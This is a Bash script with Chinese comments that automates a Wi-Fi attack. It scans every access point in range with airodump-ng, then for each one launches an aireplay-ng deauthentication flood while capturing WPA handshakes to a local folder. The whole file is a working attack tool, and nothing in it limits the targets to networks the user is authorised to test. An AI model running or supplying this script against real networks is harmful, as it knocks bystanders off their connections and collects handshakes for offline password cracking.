#!/bin/bash

# 設定參數
INTERFACE="wlan0mon"  # 確認是否正確
SCAN_DURATION=10      # 減少掃描時間以便更快測試
HANDSHAKE_DIR="/home/toki/hands"
PARSED_FILE="parsed_ap_list.txt"
CSV_FILE="scan_results-01.csv"  # airodump-ng 生成的 CSV 文件

# 如果 handshake 目錄不存在，創建它
if [ ! -d "$HANDSHAKE_DIR" ]; then
  sudo mkdir -p "$HANDSHAKE_DIR"
fi

echo "正在掃描 Wi-Fi 網絡，時間：$SCAN_DURATION 秒..."
# 加入 debug 訊息來確認掃描是否開始
sudo timeout $SCAN_DURATION airodump-ng --write-interval 1 --output-format csv -w scan_results $INTERFACE

# 檢查 CSV 文件是否生成
if [ ! -f "scan_results-01.csv" ]; then
  echo "錯誤：未能生成掃描結果文件。"
  exit 1
fi

# 解析 CSV 文件，提取 BSSID、Channel 和 ESSID，並輸出到一個文件，忽略負數頻道
echo "正在解析掃描結果..."
> "$PARSED_FILE"  # 清空解析文件

awk -F',' '/^BSSID/ {next} /^[0-9A-Fa-f]{2}/ {print $1 "," $4 "," $14}' "$CSV_FILE" | while IFS=',' read -r BSSID CH ESSID; do
    # 去除頻道中的空格
    CH=$(echo $CH | tr -d ' ')

    # 只處理正數頻道
    if [[ $CH -gt 0 ]]; then
        # 去除 ESSID 中的空格
        ESSID=$(echo $ESSID | tr -d ' ')

        # 如果 ESSID 為空，顯示 ESSID 為 "(empty)"
        if [[ -z "$ESSID" ]]; then
            ESSID="(empty)"
        fi

        # 將結果寫入文件
        echo "BSSID: $BSSID, Channel: $CH, ESSID: $ESSID" >> "$PARSED_FILE"
    fi
done

echo "解析結果已存儲至 $PARSED_FILE."

# 從解析文件中逐一處理每個 AP
while IFS=, read -r line
do
    BSSID=$(echo $line | awk '{print $2}')
    CHANNEL=$(echo $line | awk '{print $4}')
    ESSID=$(echo $line | awk -F', ESSID:' '{print $2}')

    if [ "$CHANNEL" -gt 0 ]; then
        echo "正在處理 AP，ESSID: $ESSID (BSSID: $BSSID, 頻道: $CHANNEL)..."
        
        # 使用 airodump-ng 進行捕捉
        sudo timeout 10 airodump-ng --bssid $BSSID -c $CHANNEL -w "$HANDSHAKE_DIR/$ESSID" $INTERFACE &
        
        # 並行執行 deauthentication 攻擊
        sudo timeout 10 aireplay-ng --deauth 10 -a $BSSID $INTERFACE &
        
        # 等待進程完成
        wait
        
        # 檢查是否成功捕捉到握手包
        if ls "$HANDSHAKE_DIR/$ESSID"-*.cap 1> /dev/null 2>&1; then
            echo "成功擷取握手包：$HANDSHAKE_DIR/$ESSID-01.cap"
        else
            echo "未成功擷取到握手包：$ESSID"
        fi
        
        echo "繼續處理下一個 AP..."
    else
        echo "頻道數據不正確，跳過此 AP：$BSSID"
    fi

done < "$PARSED_FILE"

echo "所有 AP 都已處理完畢，握手包已儲存至 $HANDSHAKE_DIR。"
